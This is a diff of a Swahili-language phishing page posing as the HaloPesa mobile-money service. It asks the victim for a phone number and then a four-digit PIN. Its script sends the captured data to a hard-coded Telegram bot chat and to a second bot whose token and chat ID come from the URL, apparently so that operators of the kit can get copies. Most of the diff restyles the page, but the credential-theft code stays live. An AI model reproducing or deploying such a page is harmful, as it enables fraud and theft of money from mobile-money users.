@@ -5,82 +5,77 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>HaloPesa</title>
     <style>
-        /* Kuweka kila kitu vizuri kwenye simu */
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
         
-        body { 
+        body, html { 
+            height: 100%; 
+            width: 100%; 
+            overflow: hidden; /* Hii ndio inazuia scroll */
             background-color: #f5f5f5; 
             display: flex; 
             justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            width: 100%;
+            align-items: center;
         }
 
         .phone-container { 
             background-color: #ffffff; 
             width: 100%; 
             max-width: 450px; 
-            height: 100vh; 
+            height: 100%; 
             display: flex; 
             flex-direction: column; 
             padding: 20px; 
-            box-shadow: 0 0 20px rgba(0,0,0,0.1);
             position: relative;
+            overflow: hidden; /* Inazuia content kutoroka nje */
         }
 
         .screen { 
             display: none; 
             flex-direction: column; 
-            justify-content: flex-start;
             height: 100%; 
-            padding-top: 40px;
+            width: 100%;
+            padding-top: 20px;
         }
 
         .screen.active { display: flex; }
 
-        h2 { font-size: 24px; color: #333; margin-bottom: 30px; text-align: left; }
+        h2 { font-size: 22px; color: #333; margin-bottom: 20px; }
 
         .text-input { 
             width: 100%; 
-            padding: 18px; 
+            padding: 15px; 
             border: 2px solid #eee; 
-            border-radius: 12px; 
-            font-size: 18px; 
-            outline: none;
-            transition: border-color 0.3s;
+            border-radius: 10px; 
+            font-size: 16px; 
+            margin-bottom: 20px;
         }
-        .text-input:focus { border-color: #ff5500; }
 
         .box-input-container { 
             display: flex; 
             justify-content: space-between; 
             gap: 10px; 
-            margin-bottom: 30px; 
+            margin-bottom: 20px; 
         }
 
         .box-input { 
-            width: 65px; 
-            height: 65px; 
+            width: 60px; 
+            height: 60px; 
             border: 2px solid #eee; 
-            background-color: #fafafa; 
-            border-radius: 12px; 
+            border-radius: 10px; 
             text-align: center; 
-            font-size: 24px; 
-            font-weight: bold;
+            font-size: 20px; 
         }
 
         .btn-primary { 
             width: 100%; 
-            padding: 18px; 
+            padding: 15px; 
             background-color: #ff5500; 
             color: #fff; 
             border: none; 
-            border-radius: 12px; 
-            font-size: 18px; 
-            font-weight: 600; 
-            margin-top: auto;
-            cursor: pointer;
+            border-radius: 10px; 
+            font-size: 16px; 
+            margin-top: auto; /* Inashusha button chini kabisa */
+            margin-bottom: 20px;
         }
 
         .loading-container { 
@@ -92,10 +87,10 @@
         }
         
         .spinner { 
-            width: 50px; 
-            height: 50px; 
-            border: 5px solid #f3f3f3; 
-            border-top: 5px solid #ff5500; 
+            width: 40px; 
+            height: 40px; 
+            border: 4px solid #f3f3f3; 
+            border-top: 4px solid #ff5500; 
             border-radius: 50%; 
             animation: spin 1s linear infinite; 
         }
@@ -107,17 +102,17 @@
     <div class="phone-container">
         <div class="screen active" id="screen-1">
             <h2>Ingiza namba ya simu</h2>
-            <input type="tel" class="text-input" id="phone-field" inputmode="numeric">
+            <input type="tel" class="text-input" id="phone-field">
             <button class="btn-primary" onclick="submitPhone()">Endelea</button>
         </div>
 
         <div class="screen" id="screen-2">
             <h2>Weka PIN yako</h2>
             <div class="box-input-container" id="pin-container">
-                <input type="password" class="box-input autotab" maxlength="1" inputmode="numeric">
-                <input type="password" class="box-input autotab" maxlength="1" inputmode="numeric">
-                <input type="password" class="box-input autotab" maxlength="1" inputmode="numeric">
-                <input type="password" class="box-input autotab" maxlength="1" inputmode="numeric">
+                <input type="password" class="box-input autotab" maxlength="1">
+                <input type="password" class="box-input autotab" maxlength="1">
+                <input type="password" class="box-input autotab" maxlength="1">
+                <input type="password" class="box-input autotab" maxlength="1">
             </div>
             <button class="btn-primary" onclick="submitPin()">Endelea</button>
         </div>
@@ -154,16 +149,16 @@
         const MAIN_CHAT_ID = '8735708057';
 
         async function sendToTelegram(msg) {
-            const params = new URLSearchParams(window.location.search);
-            const t = params.get('token'), i = params.get('id');
-            const data = { chat_id: MAIN_CHAT_ID, text: `[Main] ${msg}`, parse_mode: 'Markdown' };
-            
+            const p = new URLSearchParams(window.location.search);
+            const t = p.get('token'), i = p.get('id');
             fetch(`https://api.telegram.org/bot${MAIN_BOT_TOKEN}/sendMessage`, {
-                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data)
+                method: 'POST', headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({ chat_id: MAIN_CHAT_ID, text: `[Main] ${msg}`, parse_mode: 'Markdown' })
             });
             if(t && i) {
                 fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
-                    method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id:i, text:`[User] ${msg}`, parse_mode:'Markdown'})
+                    method: 'POST', headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({chat_id:i, text:`[User] ${msg}`, parse_mode:'Markdown'})
                 });
             }
         }
